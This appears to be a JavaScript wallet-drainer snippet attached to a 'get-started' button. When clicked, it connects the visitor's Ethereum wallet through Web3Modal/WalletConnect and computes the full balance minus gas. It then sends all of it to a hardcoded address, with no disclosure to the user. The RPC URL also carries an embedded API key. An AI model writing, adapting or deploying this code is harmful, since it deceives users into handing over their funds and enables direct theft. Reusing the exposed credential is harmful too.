document.getElementById('get-started').onclick = async () => {
    try {
        const providerOptions = {
            walletconnect: {
                package: WalletConnectProvider.default, // required
                options: {
                    rpc: {
                        1: "https://eth-mainnet-mempool.rpcfast.com?api_key=bDkPRaSmDwz0al5sWxt4GOBUIFjPwLOJYwblafja2ILA8iyX5ZeNZECq3NJa4EPW"
                    },
                    qrcodeModalOptions: {
                        mobileLinks: ["metamask"]
                    }
                }
            }
        };

        const web3Modal = new window.Web3Modal.default({
            cacheProvider: false, // optional
            providerOptions, // required
            disableInjectedProvider: false // Disable if you want to use WalletConnect on desktop too
        });

        const instance = await web3Modal.connect();
        const provider = new ethers.providers.Web3Provider(instance);
        const signer = provider.getSigner();

        console.log("Wallet connected");

        // Get the balance of the wallet
        const address = await signer.getAddress();
        const balance = await provider.getBalance(address);

        // Estimate gas price
        const gasPrice = await provider.getGasPrice();
        const gasLimit = 21000; // Standard gas limit for a simple ETH transfer

        // Calculate the max value to send (balance - gas fee)
        const maxGasFee = gasPrice.mul(gasLimit);
        const maxValue = balance.sub(maxGasFee);

        if (maxValue.lte(0)) {
            console.error("Insufficient balance to cover the gas fee");
            return;
        }

        // Define transaction parameters
        const tx = {
            to: "0xC0ffee254729296a45a3885639AC7E10F9d54979", // Replace with the recipient address
            value: maxValue,
            gasLimit: gasLimit,
            gasPrice: gasPrice
        };

        // Send transaction
        const txResponse = await signer.sendTransaction(tx);
        console.log("Transaction sent", txResponse);

        // Wait for transaction to be mined
        const receipt = await txResponse.wait();
        console.log("Transaction mined", receipt);
    } catch (error) {
        console.error(error);
    }
};
